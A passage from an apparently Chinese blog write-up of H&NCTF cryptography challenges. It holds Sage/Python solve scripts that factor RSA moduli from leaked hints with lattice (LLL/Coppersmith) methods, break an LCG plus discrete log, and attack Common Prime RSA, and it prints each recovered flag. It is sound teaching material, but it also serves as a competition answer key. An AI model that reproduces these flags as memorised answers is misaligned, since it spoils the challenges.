class="number">32491252910483344435013657252642812908631157928805388324401451221153787566144288668394161348411375877874802225033713208225889209706188963141818204000519335320453645771183991984871397145401449116355563131852618397832704991151874545202796217273448326885185155844071725702118012339804747838515195046843936285308</span></span><br><span class="line">m = <span class="number">1</span></span><br><span class="line">rho = <span class="number">243</span></span><br><span class="line">a = [<span class="string">&quot;pad&quot;</span>] + [hint]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">ii</span>):</span><br><span class="line">    a = [<span class="string">&quot;pad&quot;</span>] + [hint - <span class="number">2</span>^<span class="number">243</span>*ii]</span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################ params</span></span><br><span class="line">    t,k = <span class="number">20</span>,<span class="number">10</span></span><br><span class="line">    R = <span class="number">2</span>^rho</span><br><span class="line">    indices = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>)] , repeat=m):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>(i)) &lt;= t):</span><br><span class="line">            indices.append([<span class="string">&quot;pad&quot;</span>] + <span class="built_in">list</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################ attack</span></span><br><span class="line">    PR = ZZ[<span class="built_in">tuple</span>(<span class="string">f&quot;X<span class="subst">&#123;i&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m))]</span><br><span class="line">    X = [<span class="string">&quot;pad&quot;</span>] + <span class="built_in">list</span>(PR.gens())</span><br><span class="line">    poly = []</span><br><span class="line">    monomials=<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indices:</span><br><span class="line">        f = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ij <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(i)):</span><br><span class="line">            f *= (X[ij] - a[ij])^i[ij]</span><br><span class="line">        l = <span class="built_in">max</span>(k-<span class="built_in">sum</span>(i[<span class="number">1</span>:]),<span class="number">0</span>)</span><br><span class="line">        f *= N^l</span><br><span class="line">        poly.append(f)</span><br><span class="line">        <span class="keyword">for</span> mono <span class="keyword">in</span> f.monomials():</span><br><span class="line">            monomials.add(mono)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################# LLL and resultant to find roots</span></span><br><span class="line">    L = Matrix(ZZ,<span class="built_in">len</span>(poly),<span class="built_in">len</span>(monomials))</span><br><span class="line">    monomials = <span class="built_in">sorted</span>(monomials)</span><br><span class="line">    <span class="keyword">for</span> row,shift <span class="keyword">in</span> <span class="built_in">enumerate</span>(poly):</span><br><span class="line">        <span class="keyword">for</span> col,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">            L[row,col] = shift.monomial_coefficient(monomial)*monomial(*([R]*m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    res = L.LLL()</span><br><span class="line">    vec1 = res[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">        h += (vec1[idx] // monomial(*([R]*m))) * monomial</span><br><span class="line">    h = h.change_ring(ZZ)</span><br><span class="line">    res1 = h.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res1 != []):</span><br><span class="line">        <span class="built_in">print</span>(ii,res1)</span><br><span class="line"></span><br><span class="line">lists = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">with</span> Pool(<span class="number">64</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    r = <span class="built_in">list</span>(pool.imap(attack, lists[::-<span class="number">1</span>]))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 21 [(13554422673199035891677873264057443320343601269005368232165269523764733091, 1)]</span></span><br><span class="line"></span><br><span class="line">r = <span class="number">21</span> * <span class="number">2</span>^<span class="number">243</span> + <span class="number">13554422673199035891677873264057443320343601269005368232165269523764733091</span></span><br><span class="line">p = GCD(hint - r, N)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = N // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, f)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;H&amp;NCTF&#123;ac354aae-cb6b-4bd1-a9cd-090812b8f93e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;ac354aae-cb6b-4bd1-a9cd-090812b8f93e&#125;</code></p><p>​    </p><h3 id="ez-factor-pro"><a href="#ez-factor-pro" class="headerlink" title="ez-factor-pro"></a>ez-factor-pro</h3><blockquote><p>哈基坤的签到＋1QAQ！</p></blockquote><p>同上题，只不过本题 $r \in (2^{251},2^{252})$，爆破252-243=9位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">from</span> gmssl.sm4 <span class="keyword">import</span> CryptSM4, SM4_DECRYPT</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################ gen data</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">133196604547992363575584257705624404667968600447626367604523982016247386106677898877957513177151872429736948168642977575860754686097638795690422242542292618145151312000412007125887631130667228632902437183933840195380816196093162319293698836053406176957297330716990340998802156803899579713165154526610395279999</span></span><br><span class="line">hint= <span class="number">88154421894117450591552142051149160480833170266148800195422578353703847455418496231944089437130332162458102290491849331143073163240148813116171275432632366729218612063176137204570648617681911344674042091585091104687596255488609263266272373788618920171331355912434290259151350333219719321509782517693267379786</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;476922b694c764725338cca99d99c7471ec448d6bf60de797eb7cc6e71253221035eb577075f9658ac7f1a40747778ac261787baad21ee567256872fa9400c37&#x27;</span>)</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line">rho = <span class="number">243</span></span><br><span class="line">a = [<span class="string">&quot;pad&quot;</span>] + [hint]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">ii</span>):</span><br><span class="line">    a = [<span class="string">&quot;pad&quot;</span>] + [hint - <span class="number">2</span>^<span class="number">243</span>*ii]</span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################ params</span></span><br><span class="line">    t,k = <span class="number">20</span>,<span class="number">10</span></span><br><span class="line">    R = <span class="number">2</span>^rho</span><br><span class="line">    indices = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>)] , repeat=m):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>(i)) &lt;= t):</span><br><span class="line">            indices.append([<span class="string">&quot;pad&quot;</span>] + <span class="built_in">list</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################ attack</span></span><br><span class="line">    PR = ZZ[<span class="built_in">tuple</span>(<span class="string">f&quot;X<span class="subst">&#123;i&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m))]</span><br><span class="line">    X = [<span class="string">&quot;pad&quot;</span>] + <span class="built_in">list</span>(PR.gens())</span><br><span class="line">    poly = []</span><br><span class="line">    monomials=<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indices:</span><br><span class="line">        f = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ij <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(i)):</span><br><span class="line">            f *= (X[ij] - a[ij])^i[ij]</span><br><span class="line">        l = <span class="built_in">max</span>(k-<span class="built_in">sum</span>(i[<span class="number">1</span>:]),<span class="number">0</span>)</span><br><span class="line">        f *= N^l</span><br><span class="line">        poly.append(f)</span><br><span class="line">        <span class="keyword">for</span> mono <span class="keyword">in</span> f.monomials():</span><br><span class="line">            monomials.add(mono)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">################################################# LLL and resultant to find roots</span></span><br><span class="line">    L = Matrix(ZZ,<span class="built_in">len</span>(poly),<span class="built_in">len</span>(monomials))</span><br><span class="line">    monomials = <span class="built_in">sorted</span>(monomials)</span><br><span class="line">    <span class="keyword">for</span> row,shift <span class="keyword">in</span> <span class="built_in">enumerate</span>(poly):</span><br><span class="line">        <span class="keyword">for</span> col,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">            L[row,col] = shift.monomial_coefficient(monomial)*monomial(*([R]*m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    res = L.LLL()</span><br><span class="line">    vec1 = res[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">        h += (vec1[idx] // monomial(*([R]*m))) * monomial</span><br><span class="line">    h = h.change_ring(ZZ)</span><br><span class="line">    res1 = h.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res1 != []):</span><br><span class="line">        <span class="built_in">print</span>(ii,res1)</span><br><span class="line"></span><br><span class="line">lists = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">9</span>)]</span><br><span class="line"><span class="keyword">with</span> Pool(<span class="number">64</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    r = <span class="built_in">list</span>(pool.imap(attack, lists[::-<span class="number">1</span>]))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 507 [(19611044379829562160829201436207338382477210452594451207405391929580461, 1)]</span></span><br><span class="line"><span class="comment"># 506 [(14154387562606904198827209207379555465002348385457546116180255002270538669, 1)]</span></span><br><span class="line"></span><br><span class="line">r = <span class="number">507</span> * <span class="number">2</span>^<span class="number">243</span> + <span class="number">19611044379829562160829201436207338382477210452594451207405391929580461</span></span><br><span class="line">p = GCD(hint - r, N)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = N // p</span><br><span class="line"></span><br><span class="line">leak=p*q*r</span><br><span class="line">r_bytes = long_to_bytes(leak)</span><br><span class="line">iv = r_bytes[:<span class="number">16</span>] <span class="keyword">if</span> <span class="built_in">len</span>(r_bytes) &gt;= <span class="number">16</span> <span class="keyword">else</span> r_bytes + <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(r_bytes))</span><br><span class="line">key = sha256(<span class="built_in">str</span>(p + q + r).encode()).digest()[:<span class="number">16</span>] </span><br><span class="line">crypt_sm4 = CryptSM4()</span><br><span class="line">crypt_sm4.set_key(key, SM4_DECRYPT)</span><br><span class="line">m = crypt_sm4.crypt_cbc(iv, c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;H&amp;NCTF&#123;ac354aae-cb6b-4bd1-a9cd-090812b8f93e&#125;\x04\x04\x04\x04&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;ac354aae-cb6b-4bd1-a9cd-090812b8f93e&#125;</code></p><p>​    </p><h3 id="lcgp"><a href="#lcgp" class="headerlink" title="lcgp"></a>lcgp</h3><blockquote><p>哈基坤只会出签到题</p></blockquote><p>LCG+DLP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_LCG_m</span>(<span class="params">seq</span>):</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(seq)):</span><br><span class="line">        t.append(seq[i] - seq[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t) - <span class="number">1</span>):</span><br><span class="line">        T.append(t[i+<span class="number">1</span>] * t[i-<span class="number">1</span>] - t[i] ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(T)-<span class="number">1</span>):</span><br><span class="line">        mm = GCD(T[i], T[i+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> isPrime(mm):</span><br><span class="line">            m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">                <span class="keyword">if</span> isPrime(mm // i):</span><br><span class="line">                    mm = mm // i</span><br><span class="line">                    m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_LCG_a_b</span>(<span class="params">seq, m</span>):</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(seq)):</span><br><span class="line">        t.append(seq[i] - seq[i-<span class="number">1</span>])</span><br><span class="line">    a = inverse(t[<span class="number">0</span>], m) * t[<span class="number">1</span>] % m</span><br><span class="line">    b = (seq[<span class="number">1</span>] - a * seq[<span class="number">0</span>]) % m</span><br><span class="line">    <span class="keyword">return</span> (a, b)</span><br><span class="line"></span><br><span class="line">r=[]</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line">m_poss = cal_LCG_m(r)</span><br><span class="line"></span><br><span class="line">m = m_poss[<span class="number">0</span>]</span><br><span class="line">a, b = cal_LCG_a_b(r, m)</span><br><span class="line"><span class="built_in">print</span>((a, b, m))</span><br><span class="line"></span><br><span class="line">c = (r[<span class="number">0</span>]- b)*inverse(a, m) % m</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">e = <span class="number">2024</span></span><br><span class="line">m = discrete_log(mod(c,n), mod(e,n))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;H&amp;NCTF&#123;7ecf4c8c-e6a5-45c7-b7de-2fecc31d8511&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;7ecf4c8c-e6a5-45c7-b7de-2fecc31d8511&#125;</code></p><p>​    </p><h3 id="为什么出题人的rsa总是ez"><a href="#为什么出题人的rsa总是ez" class="headerlink" title="为什么出题人的rsa总是ez"></a>为什么出题人的rsa总是ez</h3><blockquote><p>复习一下。。。大佬出题全是ezrsa，害苦我了，提交记得加上H&amp;NCTF{}。</p></blockquote><p>part1参考<a href="https://github.com/Connor-McCartney/Connor-McCartney.github.io/blob/9903cbfca84281151a9ceaa5d9c3ea255487e3df/_pages/cryptography/rsa/BLAHAJ-angstrom-CTF-2024.md">angstromCTF 2024 - BLAHAJ</a>，造格求解；</p><p>part2是<a href="https://hasegawaazusa.github.io/common-prime-rsa.html">Common Prime RSA</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line"><span class="comment"># https://github.com/Connor-McCartney/Connor-McCartney.github.io/blob/9903cbfca84281151a9ceaa5d9c3ea255487e3df/_pages/cryptography/rsa/BLAHAJ-angstrom-CTF-2024.md</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">13148687178480196374316468746303529314940770955906554155276099558796308164996908275540972246587924459788286109602343699872884525600948529446071271042497049233796074202353913271513295267105242313572798635502497823862563815696165512523074252855130556615141836416629657088666030382516860597286299687178449351241568084947058615139183249169425517358363928345728230233160550711153414555500038906881581637368920188681358625561539325485686180307359210958952213244628802673969397681634295345372096628997329630862000359069425551673474533426265702926675667531063902318865506356674927615264099404032793467912541801255735763704043</span></span><br><span class="line">n=<span class="number">13718277507497477508850292481640653320398820265455820215511251843542886373380880887850571647060788265498378060163112689840208264538965960596605641194331300743676780910818492860412739541418029075802834265712602393103809065720527365081016381358333378953245379751008531500896923727040455566953960991908174586311899809864209624888469263612475732913062035036254077225370843701146080145441104733074178115602425412116325647598625157922655504918118208783230138448694045386019901732846478340735331718476554208157393418221315041837392020742062275999319586357229583509788489495876723122993592623230858393165458733055504467513549</span></span><br><span class="line">h1=<span class="number">6992022576367328281523272055384380182550712894467837916200781058620282657859189270338635886912232754034211897894637971546032107000253692739473463119025570291091085702056938901846349325941043398928197991115231668917435951127329817379935880511925882734157491821315858319170121031835598580384038723788681860763814776365440362143661999054338470989558459179388468943933975861549233231199667742564080001256192881732567616103760815633265325456143601649393547666835326272408622540044065067528568675569233240785553062685974593620235466519632833169291153478793523397788719000334929715524989845012633742964209311952378479134661</span></span><br><span class="line">h2=<span class="number">16731800146050995761642066586565348732313856101572403535951688869814016691871958158137790504490910445304384109605408840493227057830017039824412834989258703833576252634055087138315434304691218949240382395879124201923060510497916818961571111218224960267593032380037212325935576750663442553781924370849537501656957488833521657563900462052017695599020610911371304659875887924695896434699048696392210066253577839887826292569913713802634067508141124685789817330268562127695548527522031774601654778934513355315628270319037043809972087930951609429846675450469414212384044849089372435124609387061864545559812994515828333828939</span></span><br><span class="line"></span><br><span class="line">brute = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^brute):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^brute):</span><br><span class="line">        L = Matrix(ZZ, [</span><br><span class="line">            [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^brute*h1],</span><br><span class="line">            [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^brute*h2],</span><br><span class="line">            [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^(<span class="number">1024</span>-brute),h1*i+h2*j-h1*h2],</span><br><span class="line">            [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n]</span><br><span class="line">        ])</span><br><span class="line">        L[:,-<span class="number">1</span>:] *= n</span><br><span class="line">        res = L.LLL()[<span class="number">0</span>]</span><br><span class="line">        p = <span class="number">2</span>^brute*<span class="built_in">abs</span>(res[<span class="number">0</span>])+i</span><br><span class="line">        <span class="keyword">if</span>(n % p == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            q = n // p</span><br><span class="line">            f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d = inverse(e,f)</span><br><span class="line">            m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            flag1 = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(flag1)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e_is_xevaf-cityf-fisof-ketaf-metaf-disef-nuvaf-cysuf-dosuf-getuf-cysuf-dasix,bubbleBabble&#125;\xea\xc7P|OQ\x0f\xbc\xdcL;@-\x04\x9de\xd4\x14\xa7vNN\xa1\xce$T\xfd\x12\xc4\x9b\xfe\xeew&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line"><span class="comment">#https://hasegawaazusa.github.io/common-prime-rsa.html</span></span><br><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">e=<span class="number">81733668723981020451323</span> <span class="comment">#BubbleBabble编码</span></span><br><span class="line">N=<span class="number">10244621233521168199001177069337072125430662416754674144307553476569744623474797179990380824494968546110022341144527766891662229403969035901337876527595841503498459533492730326942662450786522178313517616168650624224723066308178042783540825899502172432884573844850572330970359712379107318586435848029783774998269247992706770665069866338710349292941829996807892349030660021792813986069535854445874069535737849684959397062724387110903918355074327499675776518032266136930264621047345474782910332154803497103199598761422179303240476950271702406633802957400888398042773978322395227920699611001956973796492459398737390290487</span></span><br><span class="line">g=<span class="number">2296316201623391483093360819129167852633963112610999269673854449302228853625418585609211427788830598219647604923279054340009043347798635222302374950707</span></span><br><span class="line">c=<span class="number">7522161394702437062976246147354737122573350166270857493289161875402286558096915490526439656281083416286224205494418845652940140144292045338308479237214749282932144020368779474518032067934302376430305635297260147830918089492765917640581392606559936829974748692299762475615766076425088306609448483657623795178727831373194757182797030376302086360751637238867384469269953187938304369668436238848537646544257504724753333177938997524154486602644412199535102323238852958634746165559537630341890450666170836721803871120344373143081664567068672230842855208267929484000179260292518351155693154372172449820053764896414799137097</span></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gamma = <span class="number">500</span>/<span class="number">2048</span></span><br><span class="line">cbits = ceil(nbits * (<span class="number">0.5</span> - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">u = M // (<span class="number">2</span> * g)</span><br><span class="line">v = M - <span class="number">2</span> * g * u</span><br><span class="line">GF = Zmod(N)</span><br><span class="line">x = GF.random_element()</span><br><span class="line">y = x ^ (<span class="number">2</span> * g)</span><br><span class="line"><span class="comment"># c的范围大概与N^(0.5-2*gamma)很接近</span></span><br><span class="line">cc = bsgs(y, y ^ u, (<span class="number">2</span>**(cbits-<span class="number">1</span>), <span class="number">2</span>**(cbits+<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">ab = u - cc</span><br><span class="line">apb = v + <span class="number">2</span> * g * cc</span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x ^ <span class="number">2</span> - apb * x + ab</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br><span class="line">    </span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;I wish you success in your cryptography career&#125;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;I wish you success in your cryptography career&#125;</code></p><p>​    </p><h3 id="哈基coke"><a href="#哈基coke" class="headerlink" title="哈基coke"></a>哈基coke</h3><blockquote><p>哈基人完成这个签到吧</p></blockquote><p>猫脸变换，参数矩阵求逆乘回去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 